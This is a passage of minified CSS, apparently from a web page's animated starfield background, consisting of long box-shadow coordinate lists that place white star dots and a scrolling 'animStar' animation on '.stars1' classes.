852px #fff,1436px 977px #fff,2141px 2470px #fff,1282px 390px #fff,2372px 1157px #fff,145px 2319px #fff,1322px 30px #fff,753px 1757px #fff,1524px 1361px #fff,903px 663px #fff,2374px 1147px #fff,977px 2030px #fff,1124px 2506px #fff,833px 9px #fff,1473px 955px #fff,644px 900px #fff,2478px 1721px #fff,1257px 1689px #fff,439px 120px #fff,1795px 759px #fff,1699px 2303px #fff,749px 1782px #fff,2155px 1756px #fff,952px 352px #fff,2252px 609px #fff,906px 2085px #fff,256px 2160px #fff,2474px 564px #fff,1843px 301px #fff,1255px 2532px #fff,424px 2545px #fff,896px 2048px #fff,770px 217px #fff,2533px 2084px #fff,247px 903px #fff,1257px 2194px #fff,1084px 2511px #fff,593px 2424px #fff,1417px 517px #fff,1572px 374px #fff,1800px 1525px #fff,679px 2361px #fff,2313px 1971px #fff,812px 1996px #fff,436px 1368px #fff,623px 2526px #fff,195px 233px #fff,2480px 1386px #fff,1431px 828px #fff,418px 680px #fff,1017px 1598px #fff,2403px 2000px #fff,1442px 2345px #fff,192px 2340px #fff,1701px 1114px #fff,204px 1647px #fff,1405px 310px #fff,1614px 1197px #fff,1263px 2037px #fff,1908px 1993px #fff,4px 2433px #fff,1542px 422px #fff,1413px 906px #fff,119px 723px #fff,1145px 1235px #fff,2286px 1380px #fff,2002px 2011px #fff,1119px 822px #fff,1114px 814px #fff,1099px 460px #fff,1245px 779px #fff,2165px 960px #fff,383px 1559px #fff,467px 934px #fff,1775px 1026px #fff,976px 1191px #fff,508px 2463px #fff,1787px 1953px #fff,1343px 654px #fff,705px 1670px #fff,1270px 1358px #fff,1041px 1492px #fff,339px 586px #fff,568px 209px #fff,1280px 2219px #fff,2069px 1968px #fff,603px 806px #fff,1491px 556px #fff,2475px 356px #fff,2523px 486px #fff,1330px 1034px #fff,1002px 2013px #fff,2375px 689px #fff,1170px 512px #fff,1890px 477px #fff,223px 778px #fff,391px 196px #fff,406px 745px #fff,2330px 1181px #fff,2204px 1280px #fff,2231px 1354px #fff,544px 1852px #fff,567px 827px #fff,317px 1368px #fff,171px 75px #fff,2507px 573px #fff,482px 1132px #fff,838px 1036px #fff,1322px 1824px #fff,2256px 696px #fff,1751px 2304px #fff,266px 131px #fff,1669px 1212px #fff,1326px 2078px #fff,750px 792px #fff,2046px 2184px #fff,335px 485px #fff,2040px 2136px #fff,2414px 8px #fff,2352px 2358px #fff,1551px 253px #fff,1685px 998px #fff,231px 311px #fff,1893px 821px #fff,2108px 247px #fff,2039px 76px #fff,1722px 1689px #fff,2496px 1880px #fff,1994px 1353px #fff,432px 2261px #fff,1615px 1121px #fff,1156px 1311px #fff,448px 1802px #fff,840px 1258px #fff,2223px 350px #fff,2173px 2197px #fff,1006px 552px #fff,1328px 1656px #fff,423px 1450px #fff,769px 157px #fff,397px 998px #fff,1741px 2531px #fff,1286px 2365px #fff,155px 2403px #fff,467px 1479px #fff,2298px 340px #fff,2395px 2121px #fff,1071px 211px #fff,2074px 901px #fff,1669px 478px #fff,1777px 416px #fff,568px 1334px #fff,518px 2173px #fff,1744px 1569px #fff,944px 2331px #fff,506px 224px #fff,281px 1209px #fff,685px 655px #fff,746px 2546px #fff,1057px 533px #fff,1666px 552px #fff,2130px 706px #fff,2285px 758px #fff,2020px 1844px #fff,1543px 932px #fff,2432px 1311px #fff,1544px 1122px #fff,2384px 587px #fff,979px 2082px #fff,1320px 1728px #fff,77px 111px #fff,1557px 698px #fff,344px 310px #fff,141px 1717px #fff,1764px 1902px #fff,603px 477px #fff,2470px 1737px #fff,1494px 1059px #fff,1451px 1151px #fff,288px 1110px #fff,374px 1840px #fff,545px 1859px #fff,33px 1744px #fff,907px 295px #fff,749px 2363px #fff,361px 644px #fff,1574px 565px #fff,1613px 770px #fff,1093px 734px #fff,1855px 488px #fff,2544px 782px #fff,1590px 1355px #fff,1182px 1862px #fff,731px 497px #fff,2063px 1285px #fff,2357px 2469px #fff,51px 1602px #fff,389px 1897px #fff,687px 2158px #fff,1763px 1312px #fff,1743px 1006px #fff,2308px 708px #fff,288px 1115px #fff,1264px 284px #fff,877px 601px #fff,35px 158px #fff,565px 1196px #fff,2407px 2370px #fff,1095px 233px #fff,1407px 256px #fff,1977px 2501px #fff,2152px 221px #fff,624px 23px #fff,2444px 422px #fff,307px 1132px #fff,1360px 561px #fff,979px 597px #fff,816px 391px #fff,1821px 1071px #fff,92px 1144px #fff,2308px 1793px #fff,110px 926px #fff,159px 2483px #fff,1338px 1476px #fff,1241px 471px #fff,2285px 21px #fff,1566px 1864px #fff,1710px 2344px #fff,899px 1734px #fff,498px 2351px #fff,831px 2512px #fff,615px 361px #fff,1265px 1840px #fff,539px 1531px #fff,300px 1201px #fff,2161px 687px #fff,444px 871px #fff,1931px 331px #fff,1866px 127px #fff,1899px 2372px #fff,460px 2367px #fff,2323px 654px #fff,2039px 2323px #fff,2435px 949px #fff,184px 916px #fff,979px 255px #fff,1264px 1995px #fff,1316px 1129px #fff,661px 2166px #fff,2520px 780px #fff,1635px 1385px #fff,1582px 753px #fff,1645px 1664px #fff,737px 1835px #fff,1106px 381px #fff,1420px 2450px #fff,1578px 552px #fff,2347px 891px #fff,2286px 170px #fff,600px 1505px #fff,155px 2370px #fff,1676px 1514px #fff,265px 295px #fff,703px 129px #fff,834px 924px #fff,60px 903px #fff,1348px 1166px #fff,2451px 806px #fff,1240px 568px #fff,786px 1086px #fff,979px 655px #fff,197px 1107px #fff,1409px 1989px #fff,1713px 1895px #fff,34px 2100px #fff,2265px 232px #fff,1218px 1462px #fff,2107px 51px #fff,907px 1886px #fff,1070px 477px #fff,1436px 199px #fff,859px 1408px #fff,75px 1689px #fff,2337px 642px #fff,1069px 409px #fff,1042px 1864px #fff,2465px 414px #fff,2080px 1327px #fff,756px 1654px #fff,329px 458px #fff,47px 2363px #fff,2220px 1349px #fff,2556px 838px #fff,1185px 648px #fff,1700px 990px #fff,1691px 2540px #fff,894px 647px #fff,507px 192px #fff,740px 21px #fff,162px 2223px #fff,1686px 325px #fff,111px 1228px #fff,24px 864px #fff,2248px 569px #fff,931px 284px #fff,1149px 1762px #fff,1760px 681px #fff,460px 386px #fff,646px 951px #fff,1710px 1616px #fff,299px 2203px #fff,1376px 2554px #fff,2534px 152px #fff,1032px 2408px #fff,1213px 1829px #fff,1494px 302px #fff,1211px 1142px #fff,876px 908px #fff,792px 759px #fff,1257px 961px #fff,691px 2424px #fff,2461px 1974px #fff,1562px 1613px #fff,1483px 421px #fff,1314px 166px #fff,904px 1050px #fff,253px 1317px #fff,2465px 1043px #fff,2346px 1772px #fff,540px 2431px #fff,918px 1147px #fff,135px 201px #fff,841px 1862px #fff,1169px 857px #fff,852px 392px #fff,1208px 617px #fff,2314px 378px #fff,449px 1450px #fff,2536px 1348px #fff,1013px 2302px #fff,2081px 2179px #fff,193px 389px #fff,1183px 2555px #fff,1538px 1846px #fff,168px 1691px #fff,2363px 1703px #fff,1796px 483px #fff,857px 802px #fff,793px 503px #fff,497px 1164px #fff,1024px 1211px #fff,2457px 281px #fff,2243px 2462px #fff,585px 84px #fff,2371px 1593px #fff,1247px 2410px #fff,1090px 1786px #fff,1221px 253px #fff,280px 931px #fff,2356px 797px #fff,2443px 2439px #fff,1028px 35px #fff,1881px 2378px #fff,862px 158px #fff,1276px 1646px #fff,1513px 1007px #fff,2279px 2537px #fff,284px 1446px #fff,2249px 96px #fff,598px 550px #fff,1761px 226px #fff,2281px 278px #fff,2456px 2244px #fff,68px 214px #fff,947px 1513px #fff,1583px 2158px #fff,1478px 2273px #fff,1311px 64px #fff,68px 1456px #fff,1670px 1149px #fff,1801px 1262px #fff,1437px 2546px #fff,1434px 543px #fff,1095px 1897px #fff,1027px 2223px #fff,2241px 2280px #fff,919px 653px #fff,1685px 1022px #fff,768px 1683px #fff,2029px 2477px #fff,1104px 43px #fff,262px 343px #fff,2183px 1745px #fff,369px 974px #fff,727px 208px #fff,724px 1073px #fff,859px 444px #fff,2055px 2109px #fff,1794px 983px #fff,2241px 2502px #fff,1423px 634px #fff,2092px 741px #fff,1496px 1774px #fff,740px 1815px #fff,947px 1773px #fff,2265px 1551px #fff,2125px 461px #fff,1603px 984px #fff,1198px 1816px #fff,820px 321px #fff,656px 624px #fff,1550px 176px #fff,1905px 1416px #fff,874px 153px #fff,1856px 1180px #fff,1878px 529px #fff,2090px 324px #fff,1037px 1244px #fff,599px 192px #fff,1833px 1870px #fff,884px 1707px #fff,276px 2075px #fff,948px 1449px #fff,1258px 749px #fff,370px 1432px #fff,2448px 1039px #fff,586px 2556px #fff,849px 815px #fff,2036px 2282px #fff,2382px 242px #fff,568px 2155px #fff,1181px 129px #fff,1121px 524px #fff,282px 7px #fff,658px 1518px #fff,2042px 2361px #fff,924px 2310px #fff,1772px 407px #fff,1823px 1735px #fff,1371px 170px #fff,391px 1659px #fff,2213px 1344px #fff,751px 404px #fff,1007px 868px #fff,1727px 2553px #fff,2175px 2349px #fff,1720px 76px #fff,1811px 821px #fff,1176px 6px #fff,1827px 2384px #fff,1005px 1731px #fff,945px 2168px #fff,1393px 102px #fff,784px 1385px #fff,241px 1254px #fff,1657px 1619px #fff,470px 2397px #fff,1127px 1621px #fff,137px 1084px #fff,2484px 720px #fff,1232px 1621px #fff,2164px 1473px #fff,2465px 2288px #fff,2055px 1799px #fff,1637px 1246px #fff,2222px 125px #fff,553px 668px #fff,617px 1124px #fff,266px 791px #fff,317px 733px #fff,1350px 782px #fff,2171px 13px #fff,54px 955px #fff,213px 2068px #fff,1385px 387px #fff,2135px 473px #fff,2468px 252px #fff,712px 1715px #fff,764px 1222px #fff,327px 2073px #fff,1236px 1444px #fff,440px 863px #fff,1952px 1804px #fff,1294px 1038px #fff,686px 954px #fff,374px 2087px #fff,1209px 592px #fff}.stars1{z-index:10;width:2px;height:2px;border-radius:50%;background:0 0;box-shadow:1436px 1006px #fff,1585px 1875px #fff,940px 1818px #fff,2247px 1209px #fff,242px 1809px #fff,1708px 1764px #fff,817px 1254px #fff,161px 799px #fff,1835px 2186px #fff,1784px 998px #fff,478px 229px #fff,1895px 310px #fff,448px 761px #fff,38px 280px #fff,487px 1263px #fff,442px 1128px #fff,1620px 1016px #fff,2309px 1880px #fff,2164px 698px #fff,1408px 909px #fff,634px 183px #fff,1266px 2482px #fff,2268px 1134px #fff,2283px 2186px #fff,135px 2478px #fff,2249px 2040px #fff,1555px 1118px #fff,746px 2074px #fff,152px 1649px #fff,2319px 1023px #fff,1015px 642px #fff,244px 2443px #fff,2223px 167px #fff,563px 2502px #fff,874px 2391px #fff,820px 2093px #fff,715px 1192px #fff,210px 1161px #fff,1287px 2345px #fff,1346px 886px #fff,140px 1793px #fff,2525px 1417px #fff,2174px 1327px #fff,1258px 1337px #fff,1597px 471px #fff,32px 2081px #fff,2103px 651px #fff,881px 1528px #fff,670px 1393px #fff,1293px 1450px #fff,1026px 1375px #fff,1572px 2241px #fff,1057px 517px #fff,2518px 1795px #fff,1306px 1675px #fff,674px 1762px #fff,707px 1702px #fff,184px 1604px #fff,1377px 504px #fff,1878px 1798px #fff,1060px 913px #fff,1393px 1186px #fff,795px 122px #fff,1832px 2313px #fff,613px 1159px #fff,2164px 1930px #fff,2132px 1861px #fff,228px 966px #fff,698px 689px #fff,1252px 1775px #fff,971px 2443px #fff,1289px 15px #fff,2209px 1047px #fff,692px 1779px #fff,1451px 540px #fff,6px 312px #fff,2297px 1161px #fff,840px 1282px #fff,423px 152px #fff,842px 1098px #fff,2249px 562px #fff,1201px 579px #fff,2349px 45px #fff,1789px 2088px #fff,298px 245px #fff,1996px 2515px #fff,2087px 2004px #fff,1754px 979px #fff,610px 2475px #fff,502px 340px #fff,2158px 684px #fff,90px 1987px #fff,725px 1195px #fff,1081px 758px #fff,1182px 263px #fff,2124px 1983px #fff,1670px 2136px #fff,654px 726px #fff,2456px 667px #fff,1361px 1044px #fff,2533px 1138px #fff,1321px 1529px #fff,1203px 1383px #fff,1870px 1599px #fff,854px 1348px #fff,244px 415px #fff,573px 2097px #fff,241px 1851px #fff,1762px 1750px #fff,1746px 431px #fff,430px 612px #fff,2137px 377px #fff,1600px 536px #fff,1642px 637px #fff,2406px 2212px #fff,1366px 1940px #fff,1744px 398px #fff,1090px 1906px #fff,2095px 1527px #fff,539px 1867px #fff,452px 1770px #fff,2331px 1785px #fff,2468px 72px #fff,1945px 1502px #fff,1885px 1349px #fff,1603px 1699px #fff,2539px 1970px #fff,1389px 907px #fff,1381px 2474px #fff,1016px 1680px #fff,1625px 836px #fff,676px 1730px #fff,1286px 409px #fff,1503px 1984px #fff,2306px 1094px #fff,1065px 1074px #fff,348px 1967px #fff,1908px 535px #fff,2412px 771px #fff,338px 1923px #fff,2146px 2552px #fff,1200px 1900px #fff,709px 997px #fff,208px 422px #fff,2227px 586px #fff,2130px 678px #fff,2043px 1896px #fff,137px 2090px #fff,1865px 2169px #fff,954px 1397px #fff,436px 1666px #fff,1992px 1146px #fff,1765px 1860px #fff,1491px 1173px #fff,2545px 1786px #fff,794px 1590px #fff,793px 821px #fff,901px 2505px #fff,1820px 505px #fff,2139px 2457px #fff,371px 1898px #fff,2545px 2165px #fff,1023px 1205px #fff,2188px 2333px #fff,1929px 1082px #fff,784px 302px #fff,2455px 1276px #fff,411px 396px #fff,1724px 1988px #fff,193px 2523px #fff,627px 2354px #fff,44px 1855px #fff,940px 1215px #fff,2066px 882px #fff,464px 445px #fff,470px 2336px #fff,1132px 1150px #fff,2082px 2309px #fff,2515px 1447px #fff,577px 1737px #fff,2202px 1542px #fff,1645px 1391px #fff,716px 1847px #fff,1642px 863px #fff,1053px 1458px #fff,663px 2418px #fff,1665px 2231px #fff,1347px 1777px #fff,1260px 227px #fff,2292px 914px #fff,1567px 2040px #fff,1701px 2262px #fff,30px 686px #fff,775px 1457px #fff,2122px 1037px #fff,11px 2546px #fff,1125px 548px #fff,1733px 1842px #fff,1939px 95px #fff,1656px 824px #fff,2254px 552px #fff,387px 1208px #fff,1116px 2045px #fff,1015px 151px #fff,718px 409px #fff,1987px 572px #fff,336px 41px #fff,2215px 426px #fff,2027px 1181px #fff,2508px 676px #fff,2300px 2057px #fff,167px 1095px #fff,785px 1359px #fff,318px 1007px #fff,225px 759px #fff,196px 669px #fff,893px 2036px #fff,813px 1933px #fff,1482px 290px #fff,1496px 1132px #fff,1727px 1774px #fff,2170px 700px #fff,2051px 610px #fff,398px 1869px #fff,356px 2188px #fff,1443px 2428px #fff,1405px 859px #fff,1029px 96px #fff,1040px 669px #fff,1147px 1610px #fff,868px 1810px #fff,2045px 764px #fff,1184px 408px #fff,1001px 145px #fff,182px 105px #fff,1610px 1200px #fff,1441px 2324px #fff,1338px 628px #fff,552px 1836px #fff,2062px 818px #fff,2535px 319px #fff,1264px 2253px #fff,152px 2488px #fff,57px 500px #fff,825px 41px #fff,938px 2076px #fff,2385px 1123px #fff,753px 1185px #fff,2096px 1951px #fff,1907px 2014px #fff,594px 839px #fff,1799px 279px #fff,49px 2059px #fff,1445px 425px #fff,515px 1483px #fff,1254px 1784px #fff,2459px 727px #fff,1326px 1018px #fff,1961px 541px #fff,878px 382px #fff,1208px 1061px #fff,302px 1919px #fff,2003px 371px #fff,281px 1539px #fff,536px 1397px #fff,428px 1761px #fff,1456px 298px #fff,842px 23px #fff,95px 1679px #fff,178px 1971px #fff,1064px 1894px #fff,426px 1115px #fff,1673px 1361px #fff,801px 2182px #fff,1641px 1492px #fff,1721px 438px #fff,745px 2500px #fff,2196px 465px #fff,1209px 374px #fff,1727px 875px #fff,2398px 310px #fff,1594px 831px #fff,1585px 1197px #fff,2235px 1460px #fff,2382px 1104px #fff,477px 2352px #fff,14px 1965px #fff,47px 2328px #fff,2286px 2465px #fff,961px 2360px #fff,1291px 597px #fff,1639px 1866px #fff,873px 2379px #fff,2167px 1808px #fff,1052px 1924px #fff,109px 2430px #fff,2070px 441px #fff,534px 808px #fff,1714px 1536px #fff,386px 1644px #fff,1792px 842px #fff,1181px 1905px #fff,40px 308px #fff,1077px 1342px #fff,1709px 166px #fff,954px 822px #fff,2179px 558px #fff,2024px 2142px #fff,1148px 433px #fff,1877px 1144px #fff,2471px 1952px #fff,532px 1196px #fff,2455px 40px #fff,465px 507px #fff,1714px 1091px #fff,1762px 310px #fff,1px 2132px #fff,803px 294px #fff,117px 1812px #fff,138px 1030px #fff,1731px 476px #fff,770px 1650px #fff,749px 1008px #fff,1576px 1432px #fff,1088px 397px #fff,1076px 1604px #fff,1761px 2103px #fff,803px 684px #fff,2461px 2338px #fff,2469px 2442px #fff,2516px 1199px #fff,841px 1783px #fff,720px 670px #fff,1461px 2308px #fff,1002px 508px #fff,1217px 360px #fff,1653px 2371px #fff,897px 152px #fff,1312px 1966px #fff,1193px 1723px #fff,1203px 242px #fff,2100px 388px #fff,498px 1841px #fff,1692px 1225px #fff,1361px 607px #fff,2113px 93px #fff,556px 2339px #fff,351px 997px #fff,944px 1835px #fff,795px 1628px #fff,2093px 1991px #fff,2494px 514px #fff,1948px 1075px #fff,1762px 313px #fff,1632px 2215px #fff,714px 1208px #fff,2260px 264px #fff,1657px 1515px #fff,1183px 2307px #fff,1227px 764px #fff,266px 76px #fff,2265px 2201px #fff,236px 772px #fff,1747px 167px #fff,826px 1620px #fff,2511px 2472px #fff,741px 1604px #fff,2336px 509px #fff,558px 2409px #fff,1183px 121px #fff,2288px 2234px #fff,1018px 1146px #fff,1548px 2087px #fff,601px 2247px #fff,1456px 1028px #fff,1584px 2554px #fff,1712px 1839px #fff,430px 1893px #fff,2546px 2445px #fff,1536px 2025px #fff,1393px 178px #fff,2271px 85px #fff,662px 839px #fff,2115px 2555px #fff,1694px 1858px #fff,175px 1434px #fff,358px 461px #fff,2271px 2256px #fff,1045px 428px #fff,1327px 1003px #fff,1809px 1863px #fff,2348px 2132px #fff,873px 1158px #fff,2427px 1017px #fff,55px 781px #fff,2298px 2019px #fff,41px 779px #fff,2281px 826px #fff,1868px 2444px #fff,35px 2404px #fff,1007px 553px #fff,1243px 146px #fff,1688px 1801px #fff,1674px 2188px #fff,1849px 2554px #fff,2115px 432px #fff,1102px 897px #fff,2433px 1902px #fff,8px 313px #fff,245px 2188px #fff,1541px 226px #fff,800px 2071px #fff,1909px 778px #fff,2094px 882px #fff,1562px 190px #fff,777px 592px #fff,875px 787px #fff,118px 362px #fff,1257px 2180px #fff,1287px 212px #fff,2215px 1234px #fff,1979px 858px #fff,2076px 2198px #fff,544px 241px #fff,1048px 85px #fff,1302px 914px #fff,2330px 1561px #fff,1345px 1998px #fff,1011px 1356px #fff,172px 1856px #fff,2425px 2376px #fff,522px 2082px #fff,1964px 76px #fff,2393px 377px #fff,443px 641px #fff,1233px 1841px #fff,2106px 1381px #fff,1352px 19px #fff,1891px 3px #fff,2251px 1741px #fff,2349px 2440px #fff,1238px 1599px #fff,358px 1916px #fff,2334px 1033px #fff,456px 313px #fff,1013px 547px #fff,1046px 2108px #fff,320px 773px #fff,1006px 42px #fff,2528px 1649px #fff,989px 1056px #fff,996px 1240px #fff,1773px 1386px #fff,2259px 1579px #fff,168px 873px #fff,835px 779px #fff,1360px 227px #fff,528px 1566px #fff,1512px 477px #fff,1916px 1617px #fff,2047px 124px #fff,104px 1221px #fff,131px 2209px #fff,2180px 1676px #fff,2263px 638px #fff,1668px 785px #fff,551px 813px #fff,406px 648px #fff,2138px 1691px #fff,1686px 33px #fff,1724px 2200px #fff,1707px 1803px #fff,1303px 1075px #fff,2231px 445px #fff,1329px 1702px #fff,2145px 706px #fff,940px 2342px #fff,258px 575px #fff,1325px 747px #fff,1022px 2045px #fff,624px 127px #fff,260px 391px #fff,624px 2223px #fff,680px 866px #fff,2474px 1844px #fff,333px 2416px #fff,2200px 2417px #fff,2067px 1311px #fff,742px 1355px #fff,736px 441px #fff,1962px 296px #fff,1243px 1829px #fff,2482px 211px #fff,2519px 2029px #fff,201px 1657px #fff,2557px 2269px #fff,1782px 2129px #fff,1882px 2193px #fff,42px 976px #fff,638px 484px #fff,889px 1127px #fff,559px 784px #fff,1801px 367px #fff,143px 322px #fff,1005px 1990px #fff,2344px 1174px #fff,2408px 2399px #fff,2477px 1051px #fff,576px 2371px #fff,2254px 55px #fff,631px 734px #fff,409px 285px #fff,1759px 192px #fff,560px 2249px #fff,586px 1634px #fff,1936px 849px #fff,338px 735px #fff,549px 2200px #fff,2237px 112px #fff,2143px 483px #fff,843px 2090px #fff,2520px 786px #fff,1208px 727px #fff,1493px 2247px #fff,1174px 970px #fff,2170px 381px #fff,1008px 1369px #fff,1781px 2407px #fff,1706px 2162px #fff,352px 266px #fff,1237px 555px #fff,1411px 2246px #fff,1386px 1706px #fff,2521px 683px #fff,1882px 1555px #fff,319px 2290px #fff,643px 770px #fff,1801px 1262px #fff,39px 2120px #fff,429px 1947px #fff,1073px 1244px #fff,755px 784px #fff,1569px 1524px #fff,1403px 1192px #fff,347px 1912px #fff,2440px 1546px #fff,2548px 1889px #fff,2514px 1305px #fff,2476px 2133px #fff,655px 1344px #fff,1289px 827px #fff,736px 2244px #fff,1894px 814px #fff,316px 1574px #fff,2299px 780px #fff,726px 981px #fff,2298px 634px #fff,1566px 1131px #fff,802px 1639px #fff,2502px 2038px #fff,1890px 818px #fff,1578px 1911px #fff,1934px 564px #fff,1174px 1332px #fff,1979px 1657px #fff,743px 1988px #fff,951px 369px #fff,677px 1900px #fff,1514px 1214px #fff,1978px 1398px #fff,1728px 1551px #fff,2529px 1246px #fff,2241px 696px #fff,48px 812px #fff,1377px 1471px #fff,975px 1438px #fff,1334px 1377px #fff,1609px 1586px #fff,512px 973px #fff,1403px 62px #fff,132px 1176px #fff,2252px 1805px #fff,2112px 1512px #fff,2134px 940px #fff,1622px 1611px #fff,1313px 167px #fff,413px 1867px #fff,1568px 541px #fff,168px 677px #fff,1113px 1422px #fff,2448px 2392px #fff,1374px 1432px #fff,1221px 370px #fff,193px 2058px #fff,912px 1561px #fff,2548px 1903px #fff,2142px 1043px #fff,1628px 943px #fff,1526px 2128px #fff,523px 864px #fff,2465px 64px #fff,2124px 844px #fff,1265px 1507px #fff,931px 1427px #fff,950px 1516px #fff,1917px 965px #fff,781px 994px #fff,1258px 1736px #fff,747px 971px #fff,317px 1871px #fff,21px 1325px #fff,1780px 1165px #fff,636px 275px #fff,902px 87px #fff,2508px 1472px #fff,632px 1326px #fff,1918px 259px #fff,1102px 1694px #fff,1850px 1512px #fff,1312px 1070px #fff,1313px 967px #fff,271px 791px #fff,845px 884px #fff,1010px 1275px #fff,322px 957px #fff,2013px 363px #fff,2132px 2327px #fff,297px 1757px #fff,474px 2305px #fff,1501px 615px #fff,1778px 2097px #fff,2062px 961px #fff,511px 2118px #fff,1989px 1902px #fff,105px 1744px #fff,1208px 473px #fff,463px 966px #fff,1811px 1406px #fff,857px 1902px #fff,529px 1403px #fff,2378px 826px #fff,1193px 678px #fff,542px 828px #fff,729px 2000px #fff,768px 998px #fff,955px 2539px #fff,2293px 805px #fff,1546px 134px #fff,1847px 2225px #fff,1782px 1355px #fff,1755px 1910px #fff,491px 813px #fff,1707px 1799px #fff,1386px 731px #fff,2196px 1546px #fff,1496px 1865px #fff,2363px 1623px #fff,726px 483px #fff,2525px 181px #fff,2449px 412px #fff,2452px 1784px #fff,1304px 2545px #fff,255px 592px #fff,2262px 1940px #fff,1747px 1360px #fff,2384px 1167px #fff,492px 16px #fff,2482px 1343px #fff,1399px 2519px #fff,877px 1831px #fff,708px 1528px #fff,143px 1206px #fff,1764px 708px #fff,2010px 985px #fff,1470px 228px #fff,2206px 1177px #fff,1301px 1024px #fff,2235px 1452px #fff,2489px 716px #fff,2319px 1986px #fff,2394px 1526px #fff,1806px 291px #fff,1137px 2548px #fff,20px 2220px #fff,287px 987px #fff,1975px 2199px #fff,668px 2453px #fff,1791px 1061px #fff,164px 39px #fff,1673px 1271px #fff,2262px 694px #fff,957px 2486px #fff,1032px 1714px #fff,393px 1758px #fff,107px 608px #fff,2346px 1393px #fff,1947px 1994px #fff,1771px 309px #fff,2492px 1822px #fff,28px 688px #fff;animation:animStar 125s linear infinite}.stars1:after{content:' ';top:-600px;width:2px;height:2px;border-radius:50%;position:absolute;backgroud:transparent;box-shadow:972px 1697px #fff,347px 28px #fff,2269px 790px #fff,275px 1112px #fff,798px 218px #fff,2104px 543px #fff,1208px 1547px #fff,955px 1027px #fff,1141px 2216px #fff,592px 64px #fff,60px 1252px #fff,204px 1976px #fff,2461px 2233px #fff,362px 22px #fff,1433px 335px #fff,681px 1106px #fff,2000px 1012px #fff,934px 1979px #fff,497px 979px #fff,2259px 1534px #fff,1214px 317px #fff,1823px 1444px #fff,180px 573px #fff,982px 59px #fff,2433px 2505px #fff,929px 2283px #fff,2357px 1392px #fff,734px 991px #fff,1867px 410px #fff,351px 2201px #fff,1622px 2155px #fff,973px 1429px #fff,871px 242px #fff,215px 1452px #fff,1241px 1560px #fff,1763px 1503px #fff,231px 886px #fff,924px 710px #fff,1984px 95px #fff,1152px 2008px #fff,1468px 1264px #fff,2345px 2131px #fff,351px 1361px #fff,1956px 35px #fff,1471px 1963px #fff,2136px 1536px #fff,556px 1577px #fff,1434px 1248px #fff,1610px 1122px #fff,968px 2089px #fff,380px 484px #fff,1181px 2265px #fff,2327px 491px #fff,1580px 1845px #fff,2301px 1568px #fff,992px 958px #fff,81px 2151px #fff,1388px 2104px #fff,1640px 463px #fff,168px 801px #fff,1854px 2086px #fff,1236px 1157px #fff,1920px 2207px #fff,2484px 1427px #fff,1139px 1643px #fff,1835px 1174px #fff,1319px 832px #fff,1953px 1390px #fff,1075px 1996px #fff,1519px 2549px #fff,2476px 238px #fff,1575px 1410px #fff,258px 846px #fff,1723px 613px #fff,2463px 1819px #fff,1722px 2372px #fff,2316px 1094px #fff,1820px 865px #fff,542px 2541px #fff,2076px 994px #fff,1708px 672px #fff,2528px 273px #fff,31px 1869px #fff,837px 2067px #fff,353px 1626px #fff,1651px 200px #fff,381px 2309px #fff,545px 1971px #fff,2070px 2225px #fff,2184px 697px #fff,1149px 1458px #fff,1028px 1476px #fff,740px 2054px #fff,266px 545px #fff,446px 1165px #fff,851px 864px #fff,447px 1370px #fff,2385px 1719px #fff,541px 1547px #fff,2271px 734px #fff,1893px 524px #fff,1146px 431px #fff,1335px 524px #fff,2013px 401px #fff,821px 956px #fff,820px 2390px #fff,2494px 2394px #fff,564px 1194px #fff,1752px 1515px #fff,1989px 2485px #fff,1767px 976px #fff,1338px 742px #fff,1495px 278px #fff,1226px 1446px #fff,1705px 1919px #fff,491px 1580px #fff,1643px 96px #fff,982px 1696px #fff,1456px 2428px #fff,253px 233px #fff,1418px 1280px #fff,2125px 2135px #fff,2437px 1091px #fff,2453px 364px #fff,364px 860px #fff,170px 2007px #fff,1544px 50px #fff,707px 676px #fff,226px 1574px #fff,262px 1822px #fff,936px 57px #fff,1540px 611px #fff,908px 2182px #fff,628px 890px #fff,1877px 1854px #fff,1502px 1346px #fff,2340px 1213px #fff,2293px 2463px #fff,2550px 1230px #fff,2305px 1924px #fff,2167px 1904px #fff,1417px 1699px #fff,177px 2193px #fff,2493px 2404px #fff,1351px 2435px #fff,403px 910px #fff,434px 1340px #fff,758px 201px #fff,1737px 1795px #fff,933px 2137px #fff,1306px 49px #fff,2504px 948px #fff,1765px 1298px #fff,2413px 809px #fff,2495px 869px #fff,230px 793px #fff,1135px 849px #fff,1097px 395px #fff,1196px 790px #fff,2090px 912px #fff,624px 2388px #fff,2162px 1840px #fff,2408px 1990px #fff,379px 821px #fff,494px 1454px #fff,1747px 766px #fff,534px 2394px #fff,214px 2557px #fff,2203px 1936px #fff,949px 593px #fff,1176px 2470px #fff,704px 2025px #fff,1840px 1496px #fff,2318px 754px #fff,167px 1902px #fff,2025px 311px #fff,1219px 2297px #fff,2557px 1306px #fff,354px 1669px #fff,287px 2441px #fff,708px 2475px #fff,484px 2054px #fff,36px 2189px #fff,1340px 98px #fff,949px 2367px #fff,2548px 292px #fff,1382px 458px #fff,494px 937px #fff,2253px 1254px #fff,212px 2081px #fff,2128px 736px #fff,506px 1667px #fff,1920px 1478px #fff,2430px 379px #fff,2050px 1080px #fff,123px 2495px #fff,1086px 1247px #fff,2544px 2201px #fff,1123px 248px #fff,1728px 2163px #fff,1432px 1465px #fff,228px 79px #fff,1201px 961px #fff,39px 1452px #fff,1280px 1391px #fff,2525px 708px #fff,1169px 593px #fff,1518px 1770px #fff,817px 923px #fff,715px 2287px #fff,1754px 2379px #fff,432px 305px #fff,1950px 2305px #fff,1164px 2444px #fff,884px 1554px #fff,921px 1261px #fff,1902px 674px #fff,2286px 1673px #fff,1514px 1288px #fff,638px 1116px #fff,791px 2358px #fff,1159px 554px #fff,1623px 1235px #fff,477px 18px #fff,1432px 1410px #fff,957px 643px #fff,1674px 2449px #fff,2419px 1040px #fff,1854px 2136px #fff,1435px 2235px #fff,1988px 525px #fff,682px 733px #fff,1889px 388px #fff,1006px 1425px #fff,1158px 386px #fff,1677px 8px #fff,1050px 925px #fff,868px 1543px #fff,1148px 591px #fff,2429px 2055px #fff,1467px 725px #fff,1290px 1492px #fff,1646px 306px #fff,789px 1926px #fff,2094px 2267px #fff,343px 2347px #fff,535px 883px #fff,1835px 2417px #fff,187px 327px #fff,652px 1162px #fff,2486px 463px #fff,2560px 527px #fff,677px 1282px #fff,2012px 936px #fff,2280px 575px #fff,651px 1838px #fff,1436px 1856px #fff,1025px 1456px #fff,691px 80px #fff,438px 357px #fff,582px 984px #fff,1890px 499px #fff,48px 1124px #fff,947px 43px #fff,1740px 1250px #fff,1669px 253px #fff,26px 142px #fff,1988px 2491px #fff,1378px 2290px #fff,1242px 325px #fff,1251px 1796px #fff,424px 675px #fff,1430px 